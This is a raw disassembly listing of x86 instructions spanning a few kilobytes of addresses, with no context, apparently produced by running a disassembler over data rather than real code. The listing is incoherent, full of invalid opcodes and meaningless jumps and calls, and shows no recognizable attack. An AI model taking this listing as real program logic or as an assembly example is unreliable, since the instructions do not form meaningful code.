  4246fa:	ins    BYTE PTR es:[edi],dx
  4246fb:	mov    al,ds:0xcf102fab
  424700:	or     al,0x74
  424702:	mov    ebp,ecx
  424704:	popa   
  424705:	int    0x46
  424707:	xchg   ebp,eax
  424708:	lods   eax,DWORD PTR ds:[esi]
  424709:	setp   BYTE PTR [ebp+0x3b9ef297]
  424710:	sub    DWORD PTR [eax-0x18],0xfffffffc
  424714:	jp     0x4246c4
  424716:	(bad)  
  424717:	cli    
  424718:	mov    edi,0xe3e07408
  42471d:	xor    DWORD PTR ds:0xccec49fa,0x61
  424724:	push   edi
  424725:	xchg   edi,eax
  424726:	pop    edx
  424727:	lock das 
  424729:	mov    eax,ds:0x8dbe7e9f
  42472e:	das    
  42472f:	sbb    BYTE PTR [eax-0x6],bh
  424732:	jmp    0x4246f8
  424734:	mov    ah,0xbd
  424736:	xor    esi,DWORD PTR [ebp+0x5a]
  424739:	(bad)  
  42473a:	sub    DWORD PTR [ecx*2-0x7dd0ed95],edx
  424741:	test   DWORD PTR [si],eax
  424744:	adc    eax,0x68894ab0
  424749:	sbb    BYTE PTR [ecx+0x42],al
  42474c:	retf   0x3a6f
  42474f:	ja     0x424744
  424751:	lahf   
  424752:	sub    BYTE PTR [ecx-0x59],dh
  424755:	test   al,0xe
  424757:	js     0x4247d4
  424759:	inc    esp
  42475a:	fwait
  42475b:	and    esi,ecx
  42475d:	inc    edi
  42475e:	and    DWORD PTR [esi-0x53],ecx
  424761:	inc    ebx
  424762:	mov    al,ds:0xea865a49
  424767:	sub    BYTE PTR [eax+0x7998d810],dh
  42476d:	(bad)  
  42476f:	ss pushf 
  424771:	adc    bl,BYTE PTR [edx]
  424773:	test   DWORD PTR [edi],edx
  424775:	xchg   ebx,eax
  424776:	fisubr WORD PTR [ebx]
  424778:	or     al,0xb0
  42477a:	cld    
  42477b:	in     al,dx
  42477c:	mov    bh,0x51
  42477e:	sar    DWORD PTR [ebp+eax*1-0x68c7bfcb],0xa2
  424786:	pop    ebx
  424787:	adc    DWORD PTR [edi-0x33],esp
  42478a:	(bad)  
  42478b:	scas   eax,DWORD PTR es:[edi]
  42478c:	cmp    eax,0xeaa57658
  424791:	ss jno 0x424777
  424794:	cmc    
  424795:	add    edi,DWORD PTR [esi+ebp*4]
  424798:	sbb    eax,DWORD PTR [edx-0x41f0bdcf]
  42479e:	adc    edx,0x7bf5f39e
  4247a4:	mov    eax,ds:0x322d3caf
  4247a9:	fmul   DWORD PTR [ebp-0x53]
  4247ac:	cmc    
  4247ad:	or     edi,ecx
  4247af:	out    dx,al
  4247b0:	mov    al,0x67
  4247b2:	push   eax
  4247b3:	jae    0x42478a
  4247b5:	xor    bh,BYTE PTR [eax-0x1ebe08d3]
  4247bb:	add    bl,BYTE PTR [ecx+0x28]
  4247be:	or     esi,DWORD PTR [eax]
  4247c0:	ffree  st(5)
  4247c2:	leave  
  4247c3:	es mov dh,0xdd
  4247c6:	js     0x4247d9
  4247c8:	int3   
  4247c9:	lods   eax,DWORD PTR ds:[esi]
  4247ca:	stos   DWORD PTR es:[edi],eax
  4247cb:	aaa    
  4247cc:	mov    DWORD PTR [eax+0x0],ebp
	...
  4247d7:	add    BYTE PTR [eax],al
  4247d9:	add    BYTE PTR [edi+edi*4+0x63],bl
  4247dd:	push   eax
  4247de:	jecxz  0x4247bc
  4247e0:	jg     0x4247a1
  4247e2:	data16 adc al,0x63
  4247e5:	sbb    al,0x64
  4247e7:	(bad)  
  4247e8:	neg    edi
  4247ea:	mov    eax,es
  4247ec:	add    DWORD PTR [eax],eax
  4247ee:	cld    
  4247ef:	add    DWORD PTR [eax],eax
  4247f1:	add    BYTE PTR [edi],al
  4247f3:	leave  
  4247f4:	cmp    ah,BYTE PTR [ecx+eiz*1]
  4247f7:	xor    ebx,ebx
  4247f9:	and    bh,BYTE PTR [ebp-0x6e308e66]
  4247ff:	and    esp,DWORD PTR [ebp+0x38]
  424802:	(bad)  
  424803:	pushf  
  424804:	sti    
  424805:	stos   DWORD PTR es:[edi],eax
  424806:	xor    al,0xb8
  424808:	inc    eax
  424809:	xor    DWORD PTR [ebp+0x4a],0x21
  42480d:	mov    bl,0x71
  42480f:	hlt    
  424810:	out    0xed,al
  424812:	jnp    0x424815
  424814:	popf   
  424815:	pop    ds
  424816:	cmp    al,0x63
  424818:	repz pop edx
  42481a:	cmc    
  42481b:	dec    esi
  42481c:	inc    ebp
  42481d:	call   0xdf79ffaf
  424822:	jns    0x4247a9
  424824:	ret    
  424825:	sbb    eax,0xcaa53569
  42482a:	xchg   ebx,eax
  42482b:	sub    edi,DWORD PTR [eax-0xbb853fe]
  424831:	xor    al,0x62
  424833:	cdq    
  424834:	xchg   ecx,eax
  424835:	jecxz  0x424834
  424837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424838:	sub    al,0xf6
  42483a:	ror    BYTE PTR fs:[ebx-0x10],cl
  42483e:	scas   eax,DWORD PTR es:[edi]
  42483f:	in     eax,dx
  424840:	xor    BYTE PTR [edi-0x62],bl
  424843:	ins    BYTE PTR es:[edi],dx
  424844:	jle    0x42486b
  424846:	pop    ds
  424847:	jne    0x424811
  424849:	mov    edx,DWORD PTR [edx-0x45c9f707]
  42484f:	adc    al,0x32
  424851:	mov    bl,0xb5
  424853:	(bad)  
  424854:	or     edx,DWORD PTR [esi]
  424856:	jbe    0x4248b6
  424858:	popa   
  424859:	fwait
  42485a:	and    esp,DWORD PTR [eax+0x67bd6c5d]
  424860:	scas   al,BYTE PTR es:[edi]
  424861:	and    ch,BYTE PTR [edx-0x2c]
  424864:	mov    al,ds:0xb2396d4a
  424869:	jmp    FWORD PTR [edi-0x16]
  42486c:	mov    dl,0x78
  42486e:	sub    edi,edi
  424870:	lahf   
  424871:	mov    bl,0xd0
  424873:	fisttp QWORD PTR [eax]
  424875:	dec    esi
  424876:	clc    
  424877:	cdq    
  424878:	jo     0x424803
  42487a:	(bad)  
  42487c:	cmp    edi,esi
  42487e:	xor    BYTE PTR [edi],al
  424880:	mov    ds:0x9a27e17c,eax
  424885:	bound  eax,QWORD PTR [esi]
  424887:	enter  0xef51,0x55
  42488b:	rcr    DWORD PTR [edi+ebp*1],cl
  42488e:	add    edx,DWORD PTR [ebx+edx*8-0x5f]
  424892:	and    eax,0xa31ece69
  424897:	sbb    DWORD PTR [ebp+0xeff045e],0x9fe9ae9d
  4248a1:	xchg   ebx,eax
  4248a2:	inc    edi
  4248a3:	fdiv   QWORD PTR [edx-0x19]
  4248a6:	xchg   esi,eax
  4248a7:	push   eax
  4248a8:	dec    ebx
  4248a9:	out    0x68,eax
  4248ab:	xchg   ebp,eax
  4248ac:	loop   0x4248ac
  4248ae:	repnz ror ebx,1
  4248b1:	jbe    0x42487b
  4248b3:	or     eax,0x6491dad0
  4248b8:	ds (bad) 
  4248ba:	jmp    0x4248ae
  4248bc:	xchg   ecx,eax
  4248bd:	fmul   QWORD PTR [ecx-0x464d3354]
  4248c3:	out    dx,al
  4248c4:	mov    dl,0xf3
  4248c6:	sahf   
  4248c7:	sar    BYTE PTR [edx+0x2e],1
  4248ca:	ret    0x4a60
  4248cd:	xchg   ecx,eax
  4248ce:	imul   ebx,DWORD PTR [edx],0xbc55e94a
  4248d4:	jno    0x424883
  4248d6:	mov    eax,0x65615eaf
  4248db:	pop    bp
  4248dd:	jmp    0xc309:0x4b6b6d31
  4248e4:	stos   DWORD PTR es:[edi],eax
  4248e5:	cmp    dh,dl
  4248e7:	enter  0x738f,0xbf
  4248eb:	inc    eax
  4248ec:	push   es
  4248ed:	add    cl,BYTE PTR [eax]
  4248ef:	adc    dh,BYTE PTR ds:0x7fd78db1
  4248f5:	stc    
  4248f6:	jae    0x424879
  4248f8:	xor    eax,0x19c0360e
  4248fd:	lods   eax,DWORD PTR ds:[esi]
  4248fe:	enter  0x560d,0x77
  424902:	out    0x54,eax
  424904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424905:	pushf  
  424906:	leave  
  424907:	add    DWORD PTR [ebx-0x6],edx
  42490a:	aad    0x46
  42490c:	add    eax,0x2eb43870
  424911:	aas    
  424912:	adc    eax,0x71e99553
  424917:	popf   
  424918:	jecxz  0x4248f5
  42491a:	add    bl,dh
  42491c:	stc    
  42491d:	jo     0x4248ba
  42491f:	mov    ebx,0x42d476b6
  424924:	jb     0x42498a
  424926:	lahf   
  424927:	dec    edx
  424928:	adc    DWORD PTR [eax],ecx
  42492a:	clc    
  42492b:	call   0x35e67668
  424930:	imul   eax,DWORD PTR [esi+0x27],0x4f6c48b5
  424937:	enter  0x6341,0x2c
  42493b:	push   es
  42493c:	mov    ebp,DWORD PTR [eax+0x633c441f]
  424942:	and    eax,0x550e74c2
  424947:	pop    ebx
  424948:	dec    eax
  424949:	fs mov esi,0xd1e2591c
  42494f:	cmp    dh,BYTE PTR [edx]
  424951:	int    0xf6
  424953:	outs   dx,BYTE PTR ds:[esi]
  424954:	add    DWORD PTR [eax],ebp
  424956:	mov    DWORD PTR [edx+0x16],esi
  424959:	cmp    eax,0x7c2ef346
  42495e:	ficomp WORD PTR [edi-0x58cd3fc3]
  424964:	adc    DWORD PTR [edx+edx*4],ebp
  424967:	sub    DWORD PTR [edx],esp
  424969:	push   ecx
  42496a:	cmp    esp,ebp
  42496c:	cmc    
  42496d:	sbb    eax,DWORD PTR [ecx]
  42496f:	push   cs
  424970:	lods   al,BYTE PTR ds:[esi]
  424971:	clc    
  424972:	mov    cl,0x36
  424974:	inc    BYTE PTR [ebx+edi*4-0x6edb466f]
  42497b:	and    BYTE PTR [ebx],0xcb
  42497e:	sub    al,0x26
  424980:	xchg   BYTE PTR [eax-0xf],dl
  424983:	push   es
  424984:	js     0x4249c4
  424986:	pop    ss
  424987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424988:	pop    ds
  424989:	cmp    ah,BYTE PTR [ecx-0x613c0f76]
  42498f:	fstp   QWORD PTR [ebp+0x25]
  424992:	pop    eax
  424993:	in     al,dx
  424994:	data16 or BYTE PTR [ebx+edx*8],al
  424998:	leave  
  424999:	lahf   
  42499a:	cmp    BYTE PTR [eax-0xd],al
  42499d:	pop    ss
  42499e:	mov    esi,0x30713adc
  4249a3:	imul   esi,DWORD PTR [eax-0x29cb4fa7],0xb109ccaf
  4249ad:	or     BYTE PTR [edx],0x3a
  4249b0:	test   eax,0x57bb13a8
  4249b5:	push   0x38b2edb6
  4249ba:	rcr    DWORD PTR [ebp+0x1b0b158c],1
  4249c0:	in     eax,0x8f
  4249c2:	mov    esi,0x5509c7fd
  4249c7:	push   ebp
  4249c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249c9:	into   
  4249ca:	push   ebx
  4249cb:	add    al,BYTE PTR [eax]
  4249cd:	sbb    al,0xb0
  4249cf:	cdq    
  4249d0:	rol    BYTE PTR ds:0xa088e09f,0x17
  4249d7:	inc    edx
  4249d8:	jl     0x42499f
  4249da:	or     DWORD PTR [edi],eax
  4249dc:	sahf   
  4249dd:	xchg   DWORD PTR [eax],edi
  4249df:	and    DWORD PTR cs:[eax-0x34de6705],ecx
  4249e6:	mov    eax,ds:0xb9b8d6d0
  4249eb:	and    esi,ebx
  4249ed:	xor    al,BYTE PTR [eax]
	...
  4249f7:	add    BYTE PTR [eax],al
  4249f9:	add    BYTE PTR [ebx+0x55],al
  4249fc:	pusha  
  4249fd:	(bad)  
  4249fe:	jbe    0x4249bf
  424a00:	out    dx,eax
  424a01:	(bad)  
  424a03:	test   al,0x37
  424a05:	stos   DWORD PTR es:[edi],eax
  424a06:	or     DWORD PTR [ebx-0x3d77552a],edx
  424a0c:	add    DWORD PTR [eax],eax
  424a0e:	cld    
  424a0f:	add    DWORD PTR [eax],eax
  424a11:	add    bh,al
  424a13:	mov    bh,0xcf
  424a15:	dec    esi
  424a16:	push   0xffffffda
  424a18:	ds jno 0x4249d9
  424a1b:	inc    esi
  424a1c:	inc    eax
  424a1d:	or     edi,ebp
  424a1f:	push   0xcc353312
  424a24:	data16 or al,0x3c
  424a27:	(bad)  
  424a28:	dec    edi
  424a29:	jno    0x424a41
  424a2b:	adc    cl,BYTE PTR [esi-0x5d4d9413]
  424a31:	mov    cl,BYTE PTR [edx+0x7685c7d0]
  424a37:	dec    esp
  424a38:	adc    DWORD PTR [ecx*2+0x1bb20787],esi
  424a3f:	sub    eax,0x8e1f69ef
  424a44:	push   0xffffff83
  424a46:	push   ds
  424a47:	mov    bl,0xe7
  424a49:	or     ecx,DWORD PTR [edx+0x6f004041]
  424a4f:	jns    0x4249d2
  424a51:	add    eax,0xdcbde0b
  424a56:	push   eax
  424a57:	cld    
  424a58:	or     eax,0x28fbdead
  424a5d:	cmp    al,0x92
  424a5f:	mov    eax,ds:0x91f85349
  424a64:	mov    ah,0x80
  424a66:	ret    
  424a67:	adc    DWORD PTR [esi-0x266c3a0e],eax
  424a6d:	jmp    0x424ae5
  424a6f:	lea    esi,[esi-0x5]
  424a72:	xor    BYTE PTR [eax],dl
  424a74:	retf   
  424a75:	je     0x424ace
  424a77:	lds    ecx,FWORD PTR [esi]
  424a79:	test   DWORD PTR [ecx],esp
  424a7b:	cmp    esi,ebp
  424a7d:	ret    0x12fe
  424a80:	xor    dl,cl
  424a82:	pop    edi
  424a83:	fsub   st,st(6)
  424a85:	xor    dl,BYTE PTR [esi-0x6]
  424a88:	and    al,0x7b
  424a8a:	js     0x424a86
  424a8c:	push   ecx
  424a8d:	jne    0x424af5
  424a8f:	cmp    al,0x7c
  424a91:	enter  0x4c2a,0x74
  424a95:	jb     0x424a67
  424a97:	cmp    bh,bl
  424a99:	imul   esi,edx,0x19e63f85
  424a9f:	lods   al,BYTE PTR ds:[esi]
  424aa0:	lds    ecx,FWORD PTR fs:[ecx+0x48]
  424aa4:	or     ah,BYTE PTR [ecx+0x74]
  424aa7:	imul   esp,DWORD PTR [esi+0x5544d6bb],0xffffffc0
  424aae:	mov    ch,0x3b
  424ab0:	pop    ecx
  424ab1:	add    BYTE PTR [edx],al
  424ab3:	aad    0xd5
  424ab5:	fild   DWORD PTR [eax]
  424ab7:	int    0x4
  424ab9:	cmp    DWORD PTR [ecx-0x2d742c4f],0x34b437cd
  424ac3:	ret    
  424ac4:	jno    0x424a63
  424ac6:	and    DWORD PTR [edx],ecx
  424ac8:	xor    BYTE PTR [edx+ebp*2+0x18ade2af],ah
  424acf:	test   eax,0x291283d5
  424ad4:	mov    BYTE PTR [ecx-0xc],al
  424ad7:	cld    
  424ad8:	das    
  424ad9:	cmp    al,BYTE PTR [edx+0x62]
  424adc:	xor    BYTE PTR [edx+0x6c],0x2d
  424ae0:	fld    QWORD PTR [edi+0x32]
  424ae3:	outs   dx,DWORD PTR ds:[esi]
  424ae4:	pop    ecx
  424ae5:	test   DWORD PTR [esi+0x2eb89717],ebx
  424aeb:	sbb    esp,DWORD PTR [esi]
  424aed:	daa    
  424aee:	loop   0x424aa7
  424af0:	push   ebp
  424af1:	jmp    0xa9795912
  424af6:	push   edi
  424af7:	xchg   ecx,eax
  424af8:	mov    dh,0x67
  424afa:	adc    al,0xed
  424afc:	das    
  424afd:	dec    ecx
  424afe:	ds mov esi,0x3e2eaf5f
  424b04:	aaa    
  424b05:	xor    dh,al
  424b07:	mov    DWORD PTR [ebp+0x5db10462],ebp
  424b0d:	pusha  
  424b0e:	pop    esp
  424b0f:	inc    edi
  424b10:	mov    cl,0xe0
  424b12:	jns    0x424ae6
  424b14:	pop    eax
  424b15:	sbb    al,0xb2
  424b17:	ror    BYTE PTR [edx-0x7a],cl
  424b1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b1b:	or     eax,0xffffff98
  424b1e:	jmp    0xf01926c4
  424b23:	inc    ah
  424b25:	jp     0x424b5e
  424b27:	sbb    bl,BYTE PTR [eax]
  424b29:	in     al,0x83
  424b2b:	loop   0x424aad
  424b2d:	or     eax,0x412a37f5
  424b32:	jbe    0x424ab4
  424b34:	aas    
  424b35:	jae    0x424ad4
  424b37:	rol    DWORD PTR [ebx+0x4104c4b2],cl
  424b3d:	sub    al,0x1b
  424b3f:	pushf  
  424b40:	je     0x424b57
  424b42:	jmp    0xeb11eb9b
  424b47:	jns    0x424b92
  424b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b4a:	rcl    edx,0xf5
  424b4d:	jge    0x424ae7
  424b4f:	dec    ecx
  424b50:	loop   0x424b1d
  424b52:	(bad)  
  424b53:	lds    edx,FWORD PTR [eax]
  424b55:	or     DWORD PTR [ebp+eiz*8-0x54d8d785],edx
  424b5c:	fld    QWORD PTR [ecx+eax*1+0x5c5919ff]
  424b63:	out    0xf8,al
  424b65:	cs in  al,0x89
  424b68:	aad    0x4b
  424b6a:	loope  0x424b46
  424b6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b6d:	icebp  
  424b6e:	in     eax,dx
  424b6f:	mov    ch,0x7e
  424b71:	lods   al,BYTE PTR ds:[esi]
  424b72:	fidiv  DWORD PTR [edx-0x2e]
  424b75:	push   esp
  424b76:	push   ds
  424b77:	mov    al,0xe1
  424b79:	daa    
  424b7a:	std    
  424b7b:	fistp  QWORD PTR [edx]
  424b7d:	pop    ebx
  424b7e:	rcr    DWORD PTR [ebx-0x3d1d7f7],0x28
  424b85:	add    eax,0x521477a2
  424b8a:	adc    BYTE PTR [edx],dl
  424b8c:	sub    esi,DWORD PTR ds:0xff266f1a
  424b92:	in     al,dx
  424b93:	pusha  
  424b94:	mov    edi,0x7377343
  424b99:	out    dx,eax
  424b9a:	hlt    
  424b9b:	sbb    DWORD PTR [ecx-0x5492cc23],0x75
  424ba2:	or     DWORD PTR [edi+0x43085ed5],eax
  424ba8:	nop
  424ba9:	je     0x424b6d
  424bab:	out    dx,eax
  424bac:	xchg   edx,eax
  424bad:	mov    dh,0xc7
  424baf:	xchg   DWORD PTR [ebp-0x6431408],edx
  424bb5:	cwde   
  424bb6:	bound  eax,QWORD PTR [edx-0x3c4f5dd6]
  424bbc:	daa    
  424bbd:	sbb    eax,0x8f07186a
  424bc2:	call   FWORD PTR [ebx+ecx*1-0x5e]
  424bc6:	and    BYTE PTR [eax+ebp*1-0x78b54bf9],0x4a
  424bce:	sbb    esp,DWORD PTR [edi-0x35]
  424bd1:	sub    ch,BYTE PTR [esi+0x2ba67069]
  424bd7:	scas   eax,DWORD PTR es:[edi]
  424bd8:	fild   QWORD PTR [ebp+0x1b00e22e]
  424bde:	xchg   esp,eax
  424bdf:	inc    ecx
  424be0:	push   es
  424be1:	int3   
  424be2:	xlat   BYTE PTR ds:[ebx]
  424be3:	cmp    dh,cl
  424be5:	or     BYTE PTR [edx],dl
  424be7:	add    eax,0x28525331
  424bec:	fmul   st(1),st
  424bee:	xor    al,0xce
  424bf0:	cli    
  424bf1:	sbb    bl,BYTE PTR [eax+ecx*4]
  424bf4:	jp     0x424bd3
  424bf6:	xchg   BYTE PTR [edi-0x65],al
  424bf9:	(bad)  
  424bfb:	sbb    al,0x38
  424bfd:	clc    
  424bfe:	into   
  424bff:	bound  esi,QWORD PTR [esi-0x351a4a4b]
  424c05:	test   BYTE PTR [edx-0x36e76ec5],dl
  424c0b:	(bad)  
  424c0c:	sti    
  424c0d:	js     0x424c0f
	...
  424c17:	add    BYTE PTR [eax],al
  424c19:	add    BYTE PTR [edi+0x2d],dl
  424c1c:	pop    es
  424c1d:	call   0xe967:0xeddfba7f
  424c24:	addr16 xor al,0xcf
  424c27:	inc    edi
  424c28:	sub    BYTE PTR [eax+0x1c484],al
  424c2e:	cld    
  424c2f:	add    DWORD PTR [eax],eax
  424c31:	add    BYTE PTR [ebp-0x1fc6c901],al
  424c37:	mov    edx,0x1a0ed2a8
  424c3c:	xchg   esi,eax
  424c3d:	data16 arpl bp,si
  424c40:	bound  eax,QWORD PTR [esi+0x3c]
  424c43:	data16 cmp BYTE PTR [ecx-0x22],al
  424c47:	popf   
  424c48:	std    
  424c49:	mov    ebp,0x3e7908d8
  424c4e:	xor    eax,0xa375a15c
  424c53:	loop   0x424cc6
  424c55:	in     eax,dx
  424c56:	int    0x9f
  424c58:	adc    bl,BYTE PTR [esi+0x70]
  424c5b:	pop    edx
  424c5c:	mov    bh,0x17
  424c5e:	mov    DWORD PTR [eax],ebx
  424c60:	mov    edx,0xaefaae1a
  424c65:	inc    ebx
  424c66:	mov    eax,DWORD PTR [edi]
  424c68:	test   BYTE PTR [edi],0xb
  424c6b:	cmp    DWORD PTR ds:0x8002a7be,0xffffff8d
  424c72:	and    DWORD PTR [ebp+edi*4+0x689232bc],esp
  424c79:	(bad)  
  424c7a:	lods   eax,DWORD PTR ds:[esi]
  424c7b:	and    BYTE PTR [edi-0x2c],cl
  424c7e:	inc    esi
  424c7f:	leave  
  424c80:	cwde   
  424c81:	dec    ecx
  424c82:	or     ebp,DWORD PTR [esi-0x347b39aa]
  424c88:	cs pusha 
  424c8a:	xor    BYTE PTR [ebx-0x4b],ah
  424c8d:	and    al,0xc4
  424c8f:	pop    ds
  424c90:	mov    DWORD PTR [edx],esi
  424c92:	jl     0x424ce8
  424c94:	sbb    al,0x7c
  424c96:	(bad)  
  424c97:	test   dh,0x8c
  424c9a:	neg    BYTE PTR [edi+0x2651506d]
  424ca0:	cmp    DWORD PTR [eax+0xd74866d],0x2a08c341
  424caa:	jne    0x424cc0
  424cac:	(bad)  
  424cad:	cld    
  424cae:	push   edx
  424caf:	add    BYTE PTR [ebx+0x19],dh
  424cb2:	mov    ebx,0x158b4a9a
  424cb7:	ins    BYTE PTR es:[edi],dx
  424cb8:	out    0xba,al
  424cba:	pop    edx
  424cbb:	mov    ?,WORD PTR [edx]
  424cbd:	mov    eax,0xe7cc453
  424cc2:	bnd ja 0x424d21
  424cc5:	sub    ecx,DWORD PTR [ebp-0x37]
  424cc8:	and    eax,0x11034f73
  424ccd:	cmp    BYTE PTR [ebx-0x5a],0x39
  424cd1:	xchg   ebx,eax
  424cd2:	add    eax,0xbf57801a
  424cd7:	call   0x525378df
  424cdc:	or     esp,edi
  424cde:	mov    bl,0xf4
  424ce0:	push   ebx
  424ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ce2:	rcr    DWORD PTR [eax+0x2f],1
  424ce5:	cmc    
  424ce6:	inc    ebx
  424ce7:	mov    edi,0xff3e0f67
  424cec:	fnstcw WORD PTR [edi-0x3c]
  424cef:	inc    edx
  424cf0:	add    BYTE PTR [ecx-0x3f],al
  424cf3:	push   esp
  424cf4:	gs adc ah,bh
  424cf7:	jns    0x424cb0
  424cf9:	es inc ebx
  424cfb:	cmp    ah,BYTE PTR [edx+ebx*8+0x3f8f77a2]
  424d02:	scas   al,BYTE PTR es:[edi]
  424d03:	in     al,dx
  424d04:	sub    DWORD PTR [ecx+0x76ca730c],esi
  424d0a:	sbb    ah,bh
  424d0c:	and    eax,ebx
  424d0e:	mov    esp,0x8edf7820
  424d13:	int3   
  424d14:	imul   ebp,DWORD PTR [ebp-0x4876f7f2],0xffffffa2
  424d1b:	dec    edi
  424d1c:	mov    esp,0xcc03c342
  424d21:	cmp    esi,DWORD PTR [ebx-0x50]
  424d24:	fcomi  st,st(6)
  424d26:	lds    esi,FWORD PTR [esi-0x584d0534]
  424d2c:	(bad)  [ebp+0x4e5a8312]
  424d32:	test   BYTE PTR [edx],0xa0
  424d35:	outs   dx,BYTE PTR ds:[esi]
  424d36:	xchg   DWORD PTR ds:[eax-0x7a],edi
  424d3a:	dec    ebx
  424d3b:	clc    
  424d3c:	cs jne 0x424d0a
  424d3f:	sti    
  424d40:	inc    edx
  424d41:	sub    eax,0x45326299
  424d46:	sub    DWORD PTR [ebx+0x3c],ebp
  424d49:	push   edx
  424d4a:	dec    ebp
  424d4b:	into   
  424d4c:	pop    edi
  424d4d:	retf   0xc3f0
  424d50:	mov    eax,0x35a6e864
  424d55:	ins    DWORD PTR es:[edi],dx
  424d56:	adc    eax,0xbbf25176
  424d5b:	jmp    0x424daa
  424d5d:	jbe    0x424d52
  424d5f:	xchg   ah,bh
  424d61:	outs   dx,BYTE PTR ds:[esi]
  424d62:	(bad)  
  424d63:	(bad)  
  424d64:	mov    edi,0xed61bb2e
  424d69:	mov    ds:0x18125952,al
  424d6e:	mov    ah,cl
  424d70:	int    0xa7
  424d72:	in     eax,dx
  424d73:	inc    esp
  424d74:	cli    
  424d75:	adc    DWORD PTR [eax+eax*2-0x7608f8d1],ebx
  424d7c:	aad    0x6b
  424d7e:	inc    ebx
  424d7f:	cld    
  424d80:	loope  0x424d68
  424d82:	inc    edx
  424d83:	std    
  424d84:	xchg   esp,eax
  424d85:	mov    ebp,0x3053ad02
  424d8a:	mov    al,ds:0xd2b3ef20
  424d8f:	xor    al,0x2a
  424d91:	push   0xfffffff2
  424d93:	mov    ds:0x3468b55f,eax
  424d98:	dec    esi
  424d99:	fadd   QWORD PTR cs:[esi-0x51b6b6f7]
  424da0:	push   0xfffffffa
  424da2:	daa    
  424da3:	jo     0x424d51
  424da5:	dec    eax
  424da6:	jnp    0x424d9a
  424da8:	or     eax,0x293b07a8
  424dad:	shr    DWORD PTR [ebx],cl
  424daf:	mov    ch,0xce
  424db1:	adc    al,BYTE PTR [edx+edi*8]
  424db4:	or     DWORD PTR [ebx+0x7b],esp
  424db7:	aas    
  424db8:	adc    edx,DWORD PTR [eax]
  424dba:	and    DWORD PTR [eax],edi
  424dbc:	cs sahf 
  424dbe:	mov    bh,0x63
  424dc0:	xchg   BYTE PTR [ebx],al
  424dc2:	ret    
  424dc3:	and    cl,dl
  424dc5:	mov    edi,0xe30a9e1e
  424dca:	xor    ebp,DWORD PTR ds:0x56a9fd8d
  424dd0:	loopne 0x424e46
  424dd2:	mov    eax,0x30f2d8e2
  424dd7:	add    ecx,0x72
  424dda:	jp     0x424d9e
  424ddc:	and    DWORD PTR [edx],0x5713a3d1
  424de2:	dec    esi
  424de3:	mov    ds:0xa925f5c0,al
  424de8:	out    0x91,al
  424dea:	outs   dx,WORD PTR cs:[esi]
  424ded:	xor    DWORD PTR [esi+0xd],0x42
  424df1:	mov    ebx,0x288f911c
  424df6:	test   eax,0xad75cb09
  424dfb:	mov    ds:0x5f8b11d5,eax
  424e00:	fwait
  424e01:	push   ecx
  424e02:	fimul  WORD PTR [edx]
  424e04:	cmp    DWORD PTR [edi],ebp
  424e06:	mov    bl,0x3b
  424e08:	add    ah,ch
  424e0a:	mov    ebx,0xe430bba1
  424e0f:	mov    al,0xfd
  424e11:	cwde   
  424e12:	mov    ebx,0xb44c3536
  424e17:	cdq    
  424e18:	mov    WORD PTR [edx+edx*2+0x584ab837],ss
  424e1f:	popa   
  424e20:	mov    BYTE PTR [ebx+0x5557e62f],cl
  424e26:	mov    ds:0xca2de0d5,al
  424e2b:	vunpckhps ymm0,ymm2,YMMWORD PTR [eax]
	...
  424e37:	add    BYTE PTR [eax],al
  424e39:	add    BYTE PTR [edx+ebp*1+0x2b],ch
  424e3d:	outs   dx,DWORD PTR es:[esi]
  424e3f:	daa    
  424e40:	ins    DWORD PTR es:[edi],dx
  424e41:	push   0xffffffda
  424e43:	add    BYTE PTR [ecx],0x9d
  424e46:	add    bl,BYTE PTR [esp+esi*1+0x1c6808d]
  424e4d:	add    ah,bh
  424e4f:	add    DWORD PTR [eax],eax
  424e51:	add    BYTE PTR [ebx-0x2a],dl
  424e54:	cmc    
  424e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424e56:	lea    edx,[ebx]
  424e58:	popf   
  424e59:	mov    dh,0x53
  424e5b:	hlt    
  424e5c:	mov    ds:0x2d87b25b,al
  424e61:	fs dec esi
  424e63:	xchg   esp,eax
  424e64:	das    
  424e65:	lods   eax,DWORD PTR ds:[esi]
  424e66:	cmp    eax,0xf79e6991
  424e6b:	sub    dl,BYTE PTR [eax+0x5d]
  424e6e:	xchg   esi,eax
  424e6f:	gs pushf 
  424e71:	rcr    BYTE PTR [ebx-0x4ba28973],0x40
  424e78:	or     ebx,DWORD PTR [edx]
  424e7a:	adc    bh,dh
  424e7c:	bnd call 0xc738a26f
  424e82:	stc    
  424e83:	sub    cl,BYTE PTR [edx-0x36]
  424e86:	mov    ds:0xcb5a7dbb,eax
  424e8b:	xor    al,0x6b
  424e8d:	xchg   edi,eax
  424e8e:	sbb    dl,BYTE PTR fs:[ebx-0x4938a2a1]
  424e95:	jns    0x424e70
  424e97:	shr    al,1
  424e99:	hlt    
  424e9a:	test   DWORD PTR [ebp-0x109627b5],ecx
  424ea0:	outs   dx,BYTE PTR ds:[esi]
  424ea1:	pop    esp
  424ea2:	xchg   edx,eax
  424ea3:	sahf   
  424ea4:	mov    ah,0x0
  424ea6:	enter  0x9724,0xfc
  424eaa:	mov    esi,0x7e3420f8
  424eaf:	xor    al,0x9d
  424eb1:	adc    dh,ah
  424eb3:	jge    0x424e91
  424eb5:	lea    esp,[edi-0x762a1e00]
  424ebb:	xchg   BYTE PTR [eax+eiz*2],al
  424ebe:	push   esi
  424ebf:	popa   
  424ec0:	test   al,0xd0
  424ec2:	push   0x7bc62eaa
  424ec7:	out    0x64,al
  424ec9:	lahf   
  424eca:	daa    
  424ecb:	rcr    DWORD PTR [esi+0x3f],cl
  424ece:	mov    eax,ds:0x67c77e9b
  424ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ed4:	add    bl,al
  424ed6:	pop    ds
  424ed7:	jl     0x424f2f
  424ed9:	neg    esi
  424edb:	ds nop
  424edd:	xchg   edi,eax
  424ede:	pop    esp
  424edf:	aam    0x4c
  424ee1:	fisub  DWORD PTR [esi-0x4ddd492f]
  424ee7:	pop    DWORD PTR [eax+eax*2+0x768f75f1]
  424eee:	and    eax,0x6f52e4fb
